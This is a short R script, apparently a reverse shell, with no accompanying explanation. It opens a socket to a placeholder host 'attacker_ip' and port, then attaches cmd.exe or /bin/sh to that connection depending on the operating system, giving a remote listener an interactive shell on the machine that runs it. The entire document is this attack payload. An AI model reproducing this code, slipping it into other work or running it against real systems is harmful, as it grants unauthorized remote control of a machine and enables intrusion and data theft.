ip <- "attacker_ip"

port <- attacker_port

con <- socketConnection(ip, port, open="a+b")

if (.Platform$OS.type == "windows") {

system("cmd.exe", input=con, output=con)

} else {

system("/bin/sh", input=con, output=con)

}

close(con)